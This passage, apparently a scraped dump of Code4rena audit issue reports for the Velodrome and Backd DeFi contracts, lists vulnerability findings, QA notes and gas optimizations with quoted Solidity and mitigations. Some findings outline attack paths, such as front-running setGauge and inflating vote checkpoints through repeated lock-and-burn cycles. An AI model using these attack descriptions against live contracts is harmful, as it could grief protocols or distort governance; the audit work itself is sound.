_removeTokenFrom(msg.sender, _tokenId); 527           emit Transfer(owner, address(0), _tokenId); 528       } ``` https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L517-L528  A user can deposit a token, lock it, wait for the lock to expire, transfer the token to another address, and repeat. During each iteration, a new NFT is minted and checkpointed. Calls to `getPastVotes()` will show the wrong values, since it will think the account still holds the delegation of the burnt NFT. Bribes and gauges also look at the checkpoints and will also have the wrong information  ## Tools Used Code inspection  ## Recommended Mitigation Steps Call `_moveTokenDelegates(owner,address(0))` in `_burn()`   "}, {"title": "Gauge set can be front run if bribe and gauge constructors aren't run atomically", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/54", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-velodrome-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Bribe.sol#L30-L33   # Vulnerability details  If Bribe and Gauge constructors are run not in the same transaction, the griefing attack is possible. A malicious user can run setGauge after Bribe, but before Gauge constructor, making Bribe contract unusable. The fix here is Bribe redeployment.  Setting severity to be medium as that is temporary system breaking impact.  ## Proof of Concept  setGauge can be run by anyone, but only once with a meaningful gauge:  https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Bribe.sol#L30-L33  ```solidity   function setGauge(address _gauge) external {     require(gauge == address(0), \"gauge already set\");     gauge = _gauge;   } ```  Now it is called in Gauge constructor:  https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Gauge.sol#L96-L104  ```solidity     constructor(address _stake, address _bribe, address  __ve, address _voter, bool _isForPair) {         stake = _stake;         bribe = _bribe;         _ve = __ve;         voter = _voter;          factory = msg.sender;          IBribe(bribe).setGauge(address(this)); ```  This way it will not be called before Gauge constructor, but if it is not atomic with Bribe constructor, an attacker can call in-between.  ## Recommended Mitigation Steps  Consider either running Bribe and then Gauge constructors atomically, or introducing an owner role in Bribe constructor and onlyOwner access control in setGauge, setting it manually.  "}, {"title": "Usage of deprecated transfer to send ETH", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/180", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/swappers/SwapperRouter.sol#L140 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/swappers/SwapperRouter.sol#L280   # Vulnerability details  ## Impact   Usage of deprecated transfer  Swap can revert.   ## Proof of Concept  The original `transfer` used to send eth uses a fixed stipend 2300 gas.   This was used to prevent reentrancy.   However this limit your protocol to interact with others contracts that need more than that to proceess the transaction A good article about that https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/  ## Recommended Mitigation Steps  Used call instead.  For example          (bool success, ) = msg.sender.call{amount}(\"\");         require(success, \"Transfer failed.\");  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/174", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "**Table of Contents:**  - [[L-01] Unsafe casting may overflow](#l-01-unsafe-casting-may-overflow) - [[L-02] Add constructor initializers](#l-02-add-constructor-initializers) - [[L-03] Deprecated safeApprove() function](#l-03-deprecated-safeapprove-function) - [[L-04] Deprecated approve() function](#l-04-deprecated-approve-function) - [[L-05] Lack of event emission after critical `initialize()` functions](#l-05-lack-of-event-emission-after-critical-initialize-functions) - [[L-06] No account existence check for low-level call](#l-06-no-account-existence-check-for-low-level-call) - [[L-07] `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`](#l-07-abiencodepacked-should-not-be-used-with-dynamic-types-when-passing-the-result-to-a-hash-function-such-as-keccak256) - [[N-01] Unused named returns](#n-01-unused-named-returns)  ## [L-01] Unsafe casting may overflow  SafeMath and Solidity 0.8.* handles overflows for basic math operations but not for casting. Consider using OpenZeppelin's SafeCast library to prevent unexpected overflows when casting from uint256 here:  ```solidity protocol/contracts/tokenomics/AmmConvexGauge.sol:   208:         ammLastUpdated = uint48(block.timestamp);  protocol/contracts/tokenomics/AmmGauge.sol:    41:         ammLastUpdated = uint48(block.timestamp);   150:         ammLastUpdated = uint48(block.timestamp);  protocol/contracts/tokenomics/KeeperGauge.sol:    49:         lastUpdated = uint48(block.timestamp);   115:         lastUpdated = uint48(block.timestamp); ```  ## [L-02] Add constructor initializers  As per [OpenZeppelin\u2019s (OZ) recommendation](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/6), \u201cThe guidelines are now to make it impossible for *anyone* to run `initialize` on an implementation contract, by adding an empty constructor with the `initializer` modifier. So the implementation contract gets initialized automatically upon deployment.\u201d  Note that this behaviour is also incorporated the [OZ Wizard](https://wizard.openzeppelin.com/) since the UUPS vulnerability discovery: \u201cAdditionally, we modified the code generated by the [Wizard 19](https://wizard.openzeppelin.com/) to include a constructor that automatically initializes the implementation when deployed.\u201d  Furthermore, this thwarts any attempts to frontrun the initialization tx of these contracts:  - File: AddressProvider.sol  ```solidity 47:     constructor(address treasury) { 48:         AddressProviderMeta.Meta memory meta = AddressProviderMeta.Meta(true, false); 49:         _addressKeyMetas.set(AddressProviderKeys._TREASURY_KEY, meta.toUInt()); 50:         _setConfig(AddressProviderKeys._TREASURY_KEY, treasury); 51:     } 52:  53:     function initialize(address roleManager) external initializer { 54:         AddressProviderMeta.Meta memory meta = AddressProviderMeta.Meta(true, true); 55:         _addressKeyMetas.set(AddressProviderKeys._ROLE_MANAGER_KEY, meta.toUInt()); 56:         _setConfig(AddressProviderKeys._ROLE_MANAGER_KEY, roleManager); 57:     } ```  - File: LpToken.sol  ```solidity 26:     constructor() ERC20Upgradeable() {} 27:  28:     function initialize( 29:         string calldata name_, 30:         string calldata symbol_, 31:         uint8 decimals_, 32:         address _minter 33:     ) external override initializer returns (bool) { 34:         require(_minter != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); 35:         __ERC20_init(name_, symbol_); 36:         _decimals = decimals_; 37:         minter = _minter; 38:         return true; 39:     } ```  - File: StakerVault.sol  ```solidity 61:     constructor(IController _controller) 62:         Authorization(_controller.addressProvider().getRoleManager()) 63:     { 64:         controller = _controller; 65:         IInflationManager inflationManager_ = controller.inflationManager(); 66:         require(address(inflationManager_) != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); 67:         inflationManager = inflationManager_; 68:         addressProvider = _controller.addressProvider(); 69:     } 70:  71:     function initialize(address _token) external override initializer { 72:         token = _token; 73:     } ```  ## [L-03] Deprecated safeApprove() function  Using this deprecated function can lead to unintended reverts and potentially the locking of funds. A deeper discussion on the deprecation of this function is in OZ issue #2219 (OpenZeppelin/openzeppelin-contracts#2219). The OpenZeppelin ERC20 safeApprove() function has been deprecated, as seen in the comments of the OpenZeppelin code.  As recommended by the OpenZeppelin comment, I suggest replacing safeApprove() with safeIncreaseAllowance() or safeDecreaseAllowance() instead:  ```solidity protocol/contracts/CvxCrvRewardsLocker.sol:   57:         IERC20(CRV).safeApprove(CRV_DEPOSITOR, type(uint256).max);   60:         IERC20(CVX_CRV).safeApprove(CVX_CRV_STAKING, type(uint256).max);   63:         IERC20(CRV).safeApprove(CVX_CRV_CRV_CURVE_POOL, type(uint256).max);   66:         IERC20(CVX).safeApprove(CVX_LOCKER, type(uint256).max);  protocol/contracts/RewardHandler.sol:   52:         IERC20(targetLpToken).safeApprove(address(bkdLocker), burnedAmount);   64:         IERC20(token).safeApprove(spender, type(uint256).max);  protocol/contracts/tokenomics/AmmConvexGauge.sol:   61:         IERC20(ammToken).safeApprove(booster, type(uint256).max);  protocol/contracts/tokenomics/FeeBurner.sol:   118:         IERC20(token_).safeApprove(spender_, type(uint256).max);  protocol/contracts/zaps/PoolMigrationZap.sol:   27:             IERC20(underlying_).safeApprove(address(newPool_), type(uint256).max); ```  ## [L-04] Deprecated approve() function  While `safeApprove()` in itself is deprecated, it is still better than `approve` which is subject to a known front-running attack and failing for certain token implementations that do not return a boolean value. Consider using `safeApprove` instead (or better: `safeIncreaseAllowance()`/`safeDecreaseAllowance()`):  ```solidity File: VestedEscrow.sol 24:     constructor(address rewardToken_) { 25:         IERC20(rewardToken_).approve(msg.sender, type(uint256).max); 26:     } ```  ## [L-05] Lack of event emission after critical `initialize()` functions  To record the init parameters for off-chain monitoring and transparency reasons, please consider emitting an event after the `initialize()` functions:  - File: AddressProvider.sol  ```solidity 53:     function initialize(address roleManager) external initializer { 54:         AddressProviderMeta.Meta memory meta = AddressProviderMeta.Meta(true, true); 55:         _addressKeyMetas.set(AddressProviderKeys._ROLE_MANAGER_KEY, meta.toUInt()); 56:         _setConfig(AddressProviderKeys._ROLE_MANAGER_KEY, roleManager); 57:     } ```  - File: BkdLocker.sol  ```solidity 53:     function initialize( 54:         uint256 startBoost, 55:         uint256 maxBoost, 56:         uint256 increasePeriod, 57:         uint256 withdrawDelay 58:     ) external override onlyGovernance { 59:         require(currentUInts256[_START_BOOST] == 0, Error.CONTRACT_INITIALIZED); 60:         _setConfig(_START_BOOST, startBoost); 61:         _setConfig(_MAX_BOOST, maxBoost); 62:         _setConfig(_INCREASE_PERIOD, increasePeriod); 63:         _setConfig(_WITHDRAW_DELAY, withdrawDelay); 64:     } ```  - File: LpToken.sol  ```solidity 28:     function initialize( 29:         string calldata name_, 30:         string calldata symbol_, 31:         uint8 decimals_, 32:         address _minter 33:     ) external override initializer returns (bool) { 34:         require(_minter != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); 35:         __ERC20_init(name_, symbol_); 36:         _decimals = decimals_; 37:         minter = _minter; 38:         return true; 39:     } ```  - File: StakerVault.sol  ```solidity 71:     function initialize(address _token) external override initializer { 72:         token = _token; 73:     } ```  ## [L-06] No account existence check for low-level call  Low-level calls call/delegatecall/staticcall return true even if the account called is non-existent (per EVM design). Account existence must be checked prior to calling.  Consider checking for account-existence before the `call()` to make this safely extendable to user-controlled address contexts in future (or, at least, prevent the `address(0)` entry):  ```solidity File: GasBank.sol 67:     function withdrawFrom( 68:         address account, 69:         address payable to, 70:         uint256 amount 71:     ) public override { 72:         uint256 currentBalance = _balances[account]; 73:         require(currentBalance >= amount, Error.NOT_ENOUGH_FUNDS); 74:         require( 75:             msg.sender == account || addressProvider.isAction(msg.sender), 76:             Error.UNAUTHORIZED_ACCESS 77:         ); 78:  79:         if (msg.sender == account) { 80:             uint256 ethRequired = controller.getTotalEthRequiredForGas(account); 81:             require(currentBalance - amount >= ethRequired, Error.NOT_ENOUGH_FUNDS); 82:         } 83:         _withdrawFrom(account, to, amount, currentBalance); 84:     } 85:  86:     function _withdrawFrom( 87:         address account, 88:         address payable to, 89:         uint256 amount, 90:         uint256 currentBalance 91:     ) internal { 92:         _balances[account] = currentBalance.uncheckedSub(amount); 93:  94:         // solhint-disable-next-line avoid-low-level-calls 95:         (bool success, ) = to.call{value: amount}(\"\"); //@audit can be address(0) 96:         require(success, Error.FAILED_TRANSFER); 97:  98:         emit Withdraw(account, to, amount); 99:     } ```  ## [L-07] `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`  Use `abi.encode()` instead which will pad items to 32 bytes, which will prevent hash collisions (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`). If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` instead.  ```solidity protocol/contracts/tokenomics/InflationManager.sol:   627      function _getKeeperGaugeKey(address pool) internal pure returns (bytes32) {   628:         return keccak256(abi.encodePacked(_KEEPER_WEIGHT_KEY, pool));   629      }    631      function _getAmmGaugeKey(address token) internal pure returns (bytes32) {   632:         return keccak256(abi.encodePacked(_AMM_WEIGHT_KEY, token));   633      }    635      function _getLpStakerVaultKey(address vault) internal pure returns (bytes32) {   636:         return keccak256(abi.encodePacked(_LP_WEIGHT_KEY, vault));   637      } ```  ## [N-01] Unused named returns  While not consuming more gas with the Optimizer enabled: using both named returns and a return statement isn't necessary. Removing one of those can improve code clarity:  ```solidity tokenomics/FeeBurner.sol:47:        returns (uint256 received) tokenomics/FeeBurner.sol:98:        returns (uint256 received) ``` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/173", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "1. Title : Comment was not the same as actual code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L112-L129  In the function of removepool(). [`Comment`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L115) was used to said that :   ```      * @return `true` if successful.  ```  but in [`actual code`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L128) was :   ```         return removed; ```  So it can be changed as it should be.   ## Tool Used  Manual Review  ## Another Occurances   It happen too in this code :  1.) AddressProvider.sol [Lines247-261](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L247-L261) 2). LpGauge.sol [Lines.48-62](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L48-L62)   2. Title : Redundant Code `_prepare`  This code was redundant and it could be deleted for better code since it has  [1](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L50-L55) and [2](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L74-L79) with the same fn()  ```     /**      * @notice Same as `_prepare(bytes32,uint256,uint256)` but uses a default delay      */     function _prepare(bytes32 key, uint256 value) internal returns (bool) {         return _prepare(key, value, _MIN_DELAY);     } ```  ## Tool Used  Manual Review   3. Title : NatSpec is incomplete  1.) File : contracts/AddressProvider.sol ([Lines.77-87](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L77-L87))  Missing `@return`  ```     /**      * @notice Adds action.      * @param action Address of action to add.      */     function addAction(address action) external override onlyGovernance returns (bool) {         bool result = _actions.add(action);         if (result) {             emit ActionListed(action);         }         return result;     } ```  2.) File : contracts/BkdLocker.sol ([Lines.77-83](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L77-L83))  Missing `@return`  ```      /**      * @notice Lock gov. tokens.      * @dev The amount needs to be approved in advance.      */     function lock(uint256 amount) external override {         return lockFor(msg.sender, amount);     } ``` 3.) File : contracts/Controller.sol ([Lines.78-84](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L78-L84))  Missing `@param amount`  ```     /**      * @notice Prepares the minimum amount of staked BKD required by a keeper      */     function prepareKeeperRequiredStakedBKD(uint256 amount) external override onlyGovernance {         require(addressProvider.getBKDLocker() != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);         _prepare(_KEEPER_REQUIRED_STAKED_BKD, amount);     } ``` 4.) File : contracts/Controller.sol ([Lines.100-108](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L100-L108))  Missing `@param keeper`  ```     /**      * @notice Returns true if the given keeper has enough staked BKD to execute actions      */     function canKeeperExecuteAction(address keeper) external view override returns (bool) {         uint256 requiredBKD = getKeeperRequiredStakedBKD();         return             requiredBKD == 0 ||             IERC20(addressProvider.getBKDLocker()).balanceOf(keeper) >= requiredBKD;     } ``` 5.) File : contracts/Controller.sol ([Lines.118-130](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L118-L130))  Missing `@param payer`  ```      * @return the total amount of ETH require by `payer` to cover the fees for      * positions registered in all actions      */     function getTotalEthRequiredForGas(address payer) external view override returns (uint256) {         // solhint-disable-previous-line ordering         uint256 totalEthRequired;         address[] memory actions = addressProvider.allActions();         uint256 numActions = actions.length;         for (uint256 i; i < numActions; i = i.uncheckedInc()) {             totalEthRequired += IAction(actions[i]).getEthRequiredForGas(payer);         }         return totalEthRequired;     } ```  6.) File : contracts/utils/Preparable.sol ([Lines.50-55](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L50-L55))  ```     /**      * @notice Same as `_prepare(bytes32,uint256,uint256)` but uses a default delay      */     function _prepare(bytes32 key, uint256 value) internal returns (bool) {         return _prepare(key, value, _MIN_DELAY);     } ```  7.) File :  contracts/utils/Preparable.sol ([Lines.74-79](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L74-L79))    ```      /**      * @notice Same as `_prepare(bytes32,address,uint256)` but uses a default delay      */     function _prepare(bytes32 key, address value) internal returns (bool) {         return _prepare(key, value, _MIN_DELAY);     } ```  4. Title : Typo Comment   1.) File : contracts/BkdLocker.sol ([Line.174](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L174))  `invlude` change to `include`  ```      * @dev This does not invlude the gov. tokens queued for withdrawal. ```  2.) File : contracts/AddressProvider.sol ([Line.237](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L237))  `feeze` change into `freeze`  ```      * @param key Key to feeze ``` 5. Title : simplify the number of `_MAX_SUPPLY`  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol#L12  ```   uint256 private constant _MAX_SUPPLY = 100000000 * 1e18; //100 mil max supply ```  changed to :  ``` uint256 private constant _MAX_SUPPLY =  1e26 //100mil ```   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/171", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## Low ### IERC20.approve might revert for some token Some token return void in approve and will revert if the IERC20 interface is used. Consider using OZ's safeApprove https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L25-L26  ```solidity         IERC20(rewardToken_).approve(msg.sender, type(uint256).max);  ```  ### Hardcoded WETH address WETH address might change if deployed on L2 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L25-L26  ```solidity     address private constant _WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // WETH  ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/170", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## `> 0` is less efficient than `!= 0` for uint in require condition Ref: https://twitter.com/GalloDaSballo/status/1485430908165443590 ``` protocol/contracts/tokenomics/AmmConvexGauge.sol:158:        require(amount > 0, Error.INVALID_AMOUNT); protocol/contracts/tokenomics/AmmConvexGauge.sol:171:        require(amount > 0, Error.INVALID_AMOUNT); protocol/contracts/tokenomics/VestedEscrow.sol:84:        require(unallocatedSupply > 0, \"No reward tokens in contract\"); protocol/contracts/tokenomics/KeeperGauge.sol:140:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); protocol/contracts/tokenomics/AmmGauge.sol:104:        require(amount > 0, Error.INVALID_AMOUNT); protocol/contracts/tokenomics/AmmGauge.sol:125:        require(amount > 0, Error.INVALID_AMOUNT); ```  ## Float multiplication optimization We can use the following function to save gas on float multiplications ``` // out = x * y unchecked{/} z function fmul(uint256 x, uint256 y, uint256 z) internal pure returns(uint256 out){ assembly{ if iszero(eq(div(mul(x,y),x),y)) {revert(0,0)} out := div(mul(x,y),z) } } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L156-L157  ```solidity         return Math.min((locked * elapsed) / totalTime, locked);  ```"}, {"title": "lockFor() in BkdLocker don't check that user is not 0x0 and if user by mistake call this function with value 0x0 s/he is going to lose his funds.", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/166", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L227-L232   # Vulnerability details  ## Impact function `lockFor()`  in `BkdLocker` is supposed to lock 'msg.sender` funds and increase `user` address funds but if anyone one calls it with `0x0` address by mistake then his funds will be locked forever.  ## Proof of Concept This is `lockFor()` code in `BkdLocker`: ```     function lockFor(address user, uint256 amount) public override {         govToken.safeTransferFrom(msg.sender, address(this), amount);         _userCheckpoint(user, amount, balances[user] + amount);         totalLocked += amount;         emit Locked(user, amount);     } ``` As you can see there is no check that `user` is not `0x0`. code calls `_userCheckpoint()` which will increase `0x0` balances in the contract and there is no check in `_userCheckpoint()` either and user can lose all his funds just by one simple mistake.  ## Tools Used VIM  ## Recommended Mitigation Steps check that `user` is not `0x0` in `lcokFor`  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/164", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "1. \"!=\" instead of \">\"  ## POC https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmConvexGauge.sol#L158  ## Impact != 0 better than use > 0 to safe gas.  2. Chached array  ## POC https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L42  ## Impact chached array length \"pool.length\" to save gas."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/159", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "1. Reentrancy issue in a function The functions below have an external call which can allow user to reenter into the function. Although reentering the function would cause harm to the caller than good.  **Occurrences in: *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L130-L134 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L108-L111  --------------------------------------- 2. Missing events and emit Certain events and emits are necessary for core changes and admin/critical activities to allow monitoring on third party tools. The following below are missing;  **Occurrences in: *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L68 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L74 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L99  --------------------------------- 3.. Missing zero address check The following are missing checks for existence of zero address which may lead to transfers to zero address or causing some functions to no longer be accessible.  **Occurrences in: *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L124 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L56 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L103 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L70 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L31 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L31 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L111 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L139 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L359 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L126 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L144 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L65   --------------------------------------- 4.  Use of Deprecated safeApprove() function The OpenZeppelin ERC20 SafeApprove() function has been deprecated, replace safeApprove() with safeIncreaseAllowance() or safeDecreaseAllowance() instead.  **Occurrences in: *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L52 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L64 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L118 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L27   ----------------------------------------  5. Max approvals are risky Maximum approvals are widely considered as unsafe if the approved contract becomes compromised/malicious.  **Occurrences in: *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L64 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L118    --------------------------------- 6.. Costly external calls in a loop *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol#L127 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L44 *https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L44 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L70 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L99 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L102   --------------------------------------------  7. Use of unsafe approve() https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L25                 "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/155", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# 1. ```AddressProvider.sol``` does not have a ```getSwapperRouter``` function  ## Line References  [FeeBurner.sol#L126](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L126)  [AddressProvider.sol]()  ## Impact  In ```FeeBurner.sol```, the ```_swapperRouter``` function gets the swapper router from the address provider. The ```AddressProvider.sol``` and ```IAddressProvider.sol``` contracts do not seem to have a ```getSwapperRouter``` function. If the ```_addressProvider``` in ```FeeBurner.sol``` is the ```AddressProvider.sol``` contract or implements ```IAddressProvider.sol``` then ```FeeBurner.sol``` would not function correctly or at all.  ## Proof of concept  The [_swapperRouter](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L54) function is called in the ```burnToTarget``` function which should then revert thus making ```burnToTarget``` uncallable.  ## Recommended Mitigation Steps  Add the ```getSwapperRouter``` function in the ```AddressProvider.sol``` and ```IAddressProvider.sol``` contracts.     # 2. Incompatibility with deflationary/rebase/fee-on-transfer tokens in ```FeeBurner.sol```  ## Line References  [FeeBurner.sol#L85](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L85)  ## Impact  In the ```burnToTarget``` function of ```FeeBurner.sol```, if the tokens being transferred are tokens whose balances change during a transfer such as deflationary and fee-on-transfer tokens, then the swap could fail since the swap input amount might be larger than the actual amount of tokens received in ```FeeBurner.sol```.  ## Recommended Mitigation Steps  When tokens are [transferred to the contract](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L70), check the balance of the contract before and after the transfer. Use the difference in the balances as the input amount for the swap call.     # 3. Return value for ```mint``` is not checked in ```InflationManager.sol```  ## Line References  [InflationManager.sol#L81](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L81)  [Minter.sol#L126-L135](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L126-L135)  ## Impact  In ```Minter.sol```, if inflation has not started and ```lastEvent == 0``` then the ```mint``` function will return false. In ```InflationManager.sol```, the ```mintRewards``` function does not check the return value for the mint call. When ```mintRewards``` is called by a gauge and fails, the transaction does not revert.  ## Proof of Concept  When calling ```claimRewards``` in ```AmmGauge.sol```, the call to ```mintRewards``` does not revert if minting has failed and the user loses their rewards.   ```     function claimRewards(address beneficiary) external virtual override returns (uint256) {         require(             msg.sender == beneficiary || _roleManager().hasRole(Roles.GAUGE_ZAP, msg.sender),             Error.UNAUTHORIZED_ACCESS         );         _userCheckpoint(beneficiary);         uint256 amount = perUserShare[beneficiary];         if (amount <= 0) return 0;         perUserShare[beneficiary] = 0;         controller.inflationManager().mintRewards(beneficiary, amount);         emit RewardClaimed(beneficiary, amount);         return amount;     } ```  The ```KeeperGauge.sol``` and 